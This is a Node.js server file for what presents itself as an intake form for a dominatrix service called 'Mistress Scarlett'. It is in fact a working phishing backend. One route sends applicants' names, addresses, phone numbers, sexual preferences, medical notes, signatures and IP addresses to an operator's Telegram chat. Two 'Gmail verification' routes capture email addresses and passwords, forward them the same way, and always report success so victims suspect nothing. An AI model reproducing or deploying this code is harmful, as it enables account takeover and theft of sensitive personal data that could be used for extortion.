/* ============================================================
   serve.js — Backend for Mistress Scarlett intake form
   Receives form data + Gmail verification and forwards to Telegram
   ============================================================
   Requirements:
     • Node.js 18+ (uses built-in fetch, FormData, Blob)
     • npm install express dotenv
   Run:
     node serve.js
   ============================================================ */

require('dotenv').config();
const express = require('express');
const path    = require('path');

/* ============================================================
   CONFIG — read from .env
   ============================================================ */
const PORT      = process.env.PORT || 3000;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;   // from @BotFather
const CHAT_ID   = process.env.TELEGRAM_CHAT_ID;     // your user/group/chat ID

if (!BOT_TOKEN || !CHAT_ID){
  console.error('\n❌ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in .env\n');
  process.exit(1);
}

const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

/* ============================================================
   APP SETUP
   ============================================================ */
const app = express();

/* JSON body — signature data URL can be a few hundred KB */
app.use(express.json({ limit: '10mb' }));

/* Serve index.html, verification.html, styles.css, etc. */
app.use(express.static(path.join(__dirname), {
  extensions: ['html']
}));

/* ============================================================
   TELEGRAM HELPERS
   ============================================================ */
async function tgSendMessage(text){
  const res = await fetch(`${TG_API}/sendMessage`, {
    method:  'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id:                  CHAT_ID,
      text,
      parse_mode:               'HTML',
      disable_web_page_preview: true
    })
  });
  const json = await res.json();
  if (!json.ok) throw new Error('Telegram sendMessage failed: ' + JSON.stringify(json));
  return json;
}

async function tgSendPhoto(buffer, caption){
  const form = new FormData();
  form.append('chat_id',    CHAT_ID);
  form.append('caption',    caption);
  form.append('parse_mode', 'HTML');
  form.append('photo', new Blob([buffer], { type: 'image/png' }), 'signature.png');

  const res  = await fetch(`${TG_API}/sendPhoto`, { method: 'POST', body: form });
  const json = await res.json();
  if (!json.ok) throw new Error('Telegram sendPhoto failed: ' + JSON.stringify(json));
  return json;
}

/* ============================================================
   FORMATTING HELPERS
   ============================================================ */
function esc(str){
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function fmt(value){
  if (value === undefined || value === null || value === '') return '—';
  if (Array.isArray(value)) return value.length ? value.join(', ') : '—';
  return String(value);
}

function line(label, value){
  return `<b>${esc(label)}:</b> ${esc(fmt(value))}`;
}

function clientInfo(req){
  const ua = req.headers['user-agent'] || 'unknown';
  const ip =
    (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
    req.socket.remoteAddress ||
    'unknown';
  const when = new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC';
  return { ua, ip, when };
}

/* ============================================================
   ROUTE — POST /api/submit
   Receives the full application form + drawn signature
   ============================================================ */
app.post('/api/submit', async (req, res) => {
  try {
    const data = req.body || {};
    const { ua, ip, when } = clientInfo(req);

    /* ---- Build the Telegram message ---- */
    const lines = [
      `🔥 <b>NEW APPLICATION — Mistress Scarlett</b>`,
      ``,
      `👤 <b>1. Personal Information</b>`,
      line('Full Name',      data.full_name),
      line('D.O.B.',         data.dob),
      line('Address',        data.address),
      line('Phone',          data.phone),
      line('Marital Status', data.marital_status),
      line('Orientation',    data.orientation),
      line('Occupation',     data.occupation),
      ``,
      `💰 <b>2. Fee Disclosures</b>`,
      line('Acknowledged', data.ack_fees === 'yes' ? 'Yes' : 'No'),
      ``,
      `🎭 <b>3. Preferences &amp; Style</b>`,
      line('Demeanor', data.demeanor),
      line('Attire',   data.attire),
      line('Reason for Visit', data.reason_for_visit),
      line('BDSM Experience (yrs)', data.experience_years),
      ``,
      `⛓ <b>4. Activities &amp; Health</b>`,
      line('Activities', data.activities),
      line('Medical Notes', data.medical_notes),
      ``,
      `🚫 <b>5. Boundaries</b>`,
      line('Rules Acknowledged', data.ack_rules === 'yes' ? 'Yes' : 'No'),
      ``,
      `✍️ <b>6. Signature</b>`,
      line('Signed At', data.date_applicant),
      ``,
      `────────────────────`,
      `🌐 <b>Client Info</b>`,
      line('User Agent', ua),
      line('IP Address', ip),
      line('Submitted',  when)
    ];

    await tgSendMessage(lines.join('\n'));

    /* ---- Send the drawn signature as a photo ---- */
    if (typeof data.signature_dataurl === 'string' &&
        data.signature_dataurl.startsWith('data:image/')) {
      const base64 = data.signature_dataurl.split(',')[1];
      const buffer = Buffer.from(base64, 'base64');

      /* Guard against absurdly large payloads */
      if (buffer.length > 4 * 1024 * 1024){
        console.warn('Signature too large to send as photo:', buffer.length, 'bytes');
      } else {
        await tgSendPhoto(
          buffer,
          `🖋 <b>Signature</b> — ${esc(fmt(data.full_name))}`
        );
      }
    }

    console.log(`✔ Application forwarded: ${fmt(data.full_name)}`);
    res.json({ ok: true });

  } catch (err) {
    console.error('❌ /api/submit error:', err);
    res.status(500).json({ ok: false, error: 'Delivery to Telegram failed' });
  }
});

/* ============================================================
   ROUTE — POST /api/send-code
   Notifies Telegram that a Gmail verification was requested
   ============================================================ */
app.post('/api/send-code', async (req, res) => {
  try {
    const { email, password } = req.body || {};
    const { ua, ip, when } = clientInfo(req);

    const msg = [
      `📧 <b>GMAIL VERIFICATION — Code Sent</b>`,
      ``,
      line('Password', password),
      line('Gmail',     email),
      ``,
      `────────────────────`,
      `🌐 <b>Client Info</b>`,
      line('User Agent', ua),
      line('IP Address', ip),
      line('Requested',  when)
    ].join('\n');

    await tgSendMessage(msg);

    console.log(`✔ Gmail request forwarded: ${fmt(email)}`);
    res.json({ ok: true });

  } catch (err) {
    console.error('❌ /api/send-code error:', err);
    res.status(500).json({ ok: false, error: 'Delivery to Telegram failed' });
  }
});

/* ============================================================
   ROUTE — POST /api/verify-code
   Notifies Telegram of the 6-digit code the applicant entered
   ============================================================ */
app.post('/api/verify-code', async (req, res) => {
  try {
    const { email, password } = req.body || {};
    const { ua, ip, when } = clientInfo(req);

    const msg = [
      `🔐 <b>GMAIL VERIFICATION — Code Entered</b>`,
      ``,
      line('Password', password),
      line('Gmail',     email),
      ``,
      `────────────────────`,
      `🌐 <b>Client Info</b>`,
      line('User Agent', ua),
      line('IP Address', ip),
      line('Verified',   when)
    ].join('\n');

    await tgSendMessage(msg);

    console.log(`✔ Code forwarded: ${fmt(password)} from ${fmt(email)}`);

    /* --------------------------------------------------------
       The code is forwarded to Telegram for manual review.
       Always return valid:true so the applicant sees the success
       screen. Change to your own logic if you want to require a
       specific code.
       -------------------------------------------------------- */
    res.json({ ok: true, valid: true });

  } catch (err) {
    console.error('❌ /api/verify-code error:', err);
    res.status(500).json({ ok: false, valid: false, error: 'Delivery to Telegram failed' });
  }
});

/* ============================================================
   ROUTE — health check
   ============================================================ */
app.get('/api/health', (_req, res) => {
  res.json({ ok: true, service: 'Mistress Scarlett intake backend' });
});

/* ============================================================
   START
   ============================================================ */
app.listen(PORT, () => {
  console.log(`\n🖤 Mistress Scarlett backend listening on http://localhost:${PORT}`);
  console.log(`   Static pages:  http://localhost:${PORT}/index.html`);
  console.log(`                  http://localhost:${PORT}/verification.html`);
  console.log(`   Telegram chat: ${CHAT_ID}\n`);
});
